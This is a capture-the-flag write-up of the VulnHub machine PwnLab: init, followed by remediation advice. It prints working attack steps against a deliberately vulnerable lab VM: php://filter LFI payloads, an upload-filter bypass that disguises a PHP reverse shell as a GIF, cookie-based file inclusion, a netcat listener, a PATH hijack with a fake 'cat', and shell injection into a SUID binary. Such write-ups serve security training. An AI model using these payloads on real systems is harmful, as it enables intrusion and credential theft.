# PwnLab: init Write-up

> **Platform:** VulnHub, [PwnLab: init](https://www.vulnhub.com/entry/pwnlab-init,158/) **Machine:** PwnLab: init **Difficulty:** Beginner **Operating System:** Debian Linux **Author:** Claor

---
## Overview

PwnLab: init is a compact but genuinely multi-stage box built around an image hosting application. It chains Local File Inclusion, database credential recovery, an image upload filter bypass, and a horizontal-then-vertical privilege escalation path across three separate local users before reaching root. Despite being labeled beginner-friendly, it packs in more distinct techniques than its difficulty rating suggests.

---
## Attack Path

1. Enumerated open services with Nmap, finding HTTP, RPC, and MySQL.
2. Ran Nikto against the web server and found a reference to `config.php`.
3. Identified a Local File Inclusion vulnerability in the site's `page` parameter.
4. Used a PHP filter wrapper to read `config.php` as base64 and recovered MySQL credentials.
5. Connected directly to the exposed MySQL service using those credentials.
6. Found base64-encoded user passwords inside the database and decoded them.
7. Logged into the web application with the decoded credentials.
8. Used the same LFI technique to read the source of the upload and index pages.
9. Identified the upload filter's exact validation logic and crafted a disguised PHP reverse shell.
10. Uploaded the payload and triggered it through the site's language cookie parameter.
11. Gained a shell as the web server user, then pivoted between local accounts using leaked credentials and a SUID binary.
12. Performed a PATH hijacking attack to gain the `mike` account.
13. Exploited a second custom SUID binary to gain root.
14. Retrieved the final flag.

---
## Initial Enumeration

```bash
nmap -p- -sC -sV -T5 pwnlab
```

```text
80/tcp   open  http    Apache httpd 2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp  open  rpcbind
3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1
```

A web server, standard RPC services, and a MySQL instance directly exposed to the network, worth noting immediately as a likely target once web credentials were found.

---
## Web Enumeration

```bash
nikto -host pwnlab
```

```text
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
```

Requesting `config.php` directly didn't return its contents, since PHP files execute rather than display as source. Its existence, and the fact that it likely held database credentials, was enough to make it a priority target.

---
## Identifying and Exploiting the LFI

The site used a `page` parameter to load content dynamically:

```text
http://pwnlab/?page=login
```

This pattern is a common indicator of Local File Inclusion. Since PHP files execute normally when included directly, I used PHP's `php://filter` wrapper to force the target file to be base64-encoded instead of executed:

```text
http://pwnlab/?page=php://filter/convert.base64-encode/resource=config
```

Decoding the resulting base64 output (via CyberChef) revealed the database configuration:

```php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
```

These credentials did not work against the web application's login form directly.

---
## Direct Database Access

Since MySQL was exposed on port 3306, I connected directly using the recovered credentials:

```bash
mysql -u root -p -h 192.168.56.115 -P 3306 --skip-ssl
```

The `--skip-ssl` flag was required, since the server's age meant it didn't support the SSL negotiation modern clients default to. The connection succeeded, and the `Users` table contained base64-encoded credentials for three accounts:

```text
kent | Sld6WHVCSkpOeQ== | JWzXuBJJNy
mike | U0lmZHNURW42SQ== | SIfdsTEn6I
kane | aVN2NVltMkdSbw== | iSv5Ym2GRo
```

Decoding these produced working passwords, which succeeded against the web application's login form.

---
## Reading Application Source via LFI

With access to the web application, an image upload feature was available, but it only accepted image files. To understand exactly what the upload filter checked for, I used the same LFI technique to read the PHP source of both the index and upload pages:

```text
http://pwnlab/?page=php://filter/convert.base64-encode/resource=index
http://pwnlab/?page=php://filter/convert.base64-encode/resource=upload
```

The index page revealed that the `page` parameter itself was driven by a cookie-based language selection mechanism, never fully implemented, but still functional enough to include arbitrary files through the same LFI path:

```php
if (isset($_COOKIE['lang']))
{
    include("lang/".$_COOKIE['lang']);
}
```

The upload page revealed the exact validation logic protecting the upload feature:

```php
$file_ext  = strrchr($filename, '.');
$imageinfo = getimagesize($_FILES['file']['tmp_name']);
$whitelist = array(".jpg",".jpeg",".gif",".png");

if (!(in_array($file_ext, $whitelist))) { die('Not allowed extension, please upload images only.'); }
if (strpos($filetype,'image') === false) { die('Error 001'); }
if ($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && ...) { die('Error 002'); }
```

The filter checked the file extension against a whitelist, the MIME type reported by the browser, and the actual image data via `getimagesize()`. All three checks needed to pass.

---
## Bypassing the Upload Filter

To satisfy `getimagesize()`, the file needed to start with valid image header bytes. I prepended the GIF89a magic bytes to a standard PHP reverse shell (the pentestmonkey `php-reverse-shell.php` payload), then saved the file with a `.gif` extension:

```php
GIF89a
<?php
// php-reverse-shell payload, IP and port configured for the local listener
```

This satisfied the extension whitelist and the `getimagesize()` check simultaneously, since the file began with a valid GIF header even though the rest of its contents were PHP.

---
## Uploading and Triggering the Shell

I uploaded the disguised file through the site's upload form. Since the file had a `.gif` extension, the server stored it without executing it directly. To actually run the embedded PHP, I used the LFI vulnerability in the `lang` cookie parameter to include the uploaded file instead of a language file:

```text
Cookie: lang=../upload/56f2a667e950d965def5259689945598.gif
```

I set up a listener before sending the request:

```bash
nc -lvnp 4444
```

Requesting the page with that cookie set caused the server to include and execute the uploaded file as PHP, and the listener caught a shell.

---
## Stabilizing the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

The resulting shell had very limited permissions.

---
## Pivoting Between Local Users

Using the decoded database credentials from earlier, I was able to switch to two local accounts, `kane` and `kent`, since their web application passwords happened to match their system passwords. Nothing useful turned up under `kent`, but `kane`'s home directory contained a custom SUID binary:

```bash
./msgmike
```

```text
cat: /home/mike/msg.txt: No such file or directory
```

The binary was clearly attempting to read a file belonging to `mike` and failing, but the underlying `cat` call gave away a path hijacking opportunity. Checking for SUID binaries confirmed `msgmike` ran with elevated privileges:

```bash
find / -perm -u=s -type f 2>/dev/null
```

---
## PATH Hijacking to Reach Mike

Since the binary called `cat` without specifying a full path, I created a malicious replacement and placed it earlier in the `PATH`:

```bash
echo '/bin/bash' > cat
chmod +x cat
export PATH=$(pwd):$PATH
```

Running the binary again now executed my fake `cat`, which spawned a shell as `mike` instead:

```bash
./msgmike
```

---
## Escalating to Root

Inside `mike`'s home directory was a second custom binary, `msg2root`. Running it directly produced limited output, but inspecting its strings revealed it expected two arguments and echoed input back, a strong indicator of a command injection opportunity:

```bash
./msg2root
test && /bin/sh
```

Supplying a shell metacharacter as part of the input caused the binary to execute it, dropping into a root shell.

---
## Final Flag

```bash
cd /root
cat flag.txt
```

```text
If you are reading this, means that you have break 'init' Pwnlab. I hope you
enjoyed and thanks for your time doing this challenge.

Please send me your feedback or your writeup, I will love reading it.

For sniferl4bs.com
claor@PwnLab.net - @Chronicoder
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root/flag.txt`|Retrieved after a command injection exploit against a custom root-owned binary|

PwnLab: init uses a single final flag rather than a multi-flag structure.

---
## Remediation

- **Never expose a database service directly to the network** without strict access controls. MySQL being reachable from outside turned a single leaked credential into full database access.
- **Never store plaintext or reversibly-encoded credentials in a database.** Base64 is encoding, not protection, and the passwords here were readable within seconds of dumping the table.
- **Sanitize and strictly validate any parameter used to include files** (the `page` and `lang` parameters here). PHP filter wrappers like `php://filter` should never be reachable through user input.
- **Never rely on file extension, MIME type, or `getimagesize()` alone to validate uploads.** All three were satisfied simultaneously here by prepending a valid image header to a PHP payload. Uploaded files should be stored outside the web root, or served in a way that prevents execution entirely.
- **Avoid running privileged binaries that call system commands without a fully qualified path.** The `msgmike` binary's unqualified call to `cat` enabled a straightforward PATH hijacking attack.
- **Validate and sanitize all binary input rigorously**, especially in custom SUID tools. The `msg2root` binary's command injection flaw was the final and most direct path to root.
- **Avoid deploying custom, unaudited SUID binaries at all** where standard system tools and proper `sudo` configuration can achieve the same result more safely.

---
## Lessons Learned

- LFI combined with PHP filter wrappers is one of the most reliable ways to read source code that would otherwise execute rather than display.
- Reading an application's actual validation logic, rather than guessing at it, is far more efficient than blind trial and error against an upload filter.
- Image upload filters that check extension, MIME type, and file header can still all be satisfied at once with a single crafted file. Defense in depth only works if each layer is genuinely independent.
- Horizontal privilege escalation (user to user, not just user to root) is a real and common pattern. Reused or leaked credentials from an earlier stage are worth trying against every account discovered later.
- Custom SUID binaries, especially small, purpose-built ones, deserve careful scrutiny. They are far more likely to contain unsafe practices like unqualified command calls or naive input handling than well-audited system utilities.

---
## Tools Used
- Nmap
- Nikto
- CyberChef
- MySQL client
- Burp Suite
- Netcat
- pentestmonkey PHP reverse shell

---
## Technologies Encountered
- Apache 2.4.10
- PHP
- MySQL 5.5
- Debian Linux

---
## Skills Practiced
- Network Enumeration
- Local File Inclusion (LFI)
- PHP Wrapper Abuse
- Database Credential Recovery
- File Upload Filter Bypass
- Reverse Shell Handling
- PATH Hijacking
- Command Injection Exploitation